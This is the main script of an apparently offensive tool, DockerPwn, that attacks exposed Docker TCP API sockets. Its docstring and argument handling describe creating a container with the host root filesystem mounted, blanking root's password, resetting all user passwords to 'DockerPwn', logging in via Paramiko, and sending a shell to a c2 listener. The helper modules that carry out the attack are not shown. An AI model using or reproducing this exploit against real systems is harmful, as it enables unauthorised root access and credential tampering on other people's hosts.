#/usr/bin/python3

'''
Exploit for exposed Docker TCP Socket.

This will automatically create a container on the Docker host with the root filesystem mounted,
allowing arbitrary read and write of the root filesystem (which is bad).

Once created, the script will empty the password requirement for 'root', and will alter any user
with a valid Unix password to have a password of 'DockerPwn'

Once this is done, the script will attempt to use Paramiko to login to all users enumerated from 
/etc/passwd using the password 'DockerPwn', and a shell will be spawned. 

Roadmap:

Utilize the limited command execution via Paramiko to get a better shell, and automatically escalate to root.


Usage:

DockerPwn.py [-h] [--target TARGET] [--port PORT]

optional arguments:
  -h, --help       show this help message and exit
  --target TARGET  IP of Docker Host
  --port PORT      Docker API TCP Port

'''

import argparse
import sys
import createContainer
import shadowPwn
import shellHandler
from subprocess import Popen
import threading

def main():

    parser = argparse.ArgumentParser()
    parser.add_argument("--target", help="IP of Docker Host", type=str)
    parser.add_argument("--port", help="Docker API TCP Port", type=int)
    parser.add_argument("--image", help="Docker image to use. Default is Alpine Linux.", type=str)
    parser.add_argument("--method", help="Method to use. Valid methods are shadow, chroot, binary. Default is shadow.", type=str)
    parser.add_argument("--c2", help="Local IP and port in [IP]:[PORT] format to receive the shell.", type=str)
    args = parser.parse_args()
    target = args.target
    port = args.port
    image = args.image
    method = args.method
    c2 = args.c2

    if target is not None and port is not None:
        
        if image is None:
            image = 'alpine'

        containerID = createContainer.create(target, port, image)

        if method is None or method == 'shadow':
            shadowPwn.attack(target, port, containerID, c2)
            shellHandler.listen(c2)

       # elif method == 'chroot':
            #chrootPwn.attack(target, port, containerID)

       # elif method == 'binary':
            #binPwn.attack(target, port, containerID)

    else:
        print("[!] You must specify a target and port. Exiting.")
        sys.exit(0)
    

if __name__ == '__main__':
    main()
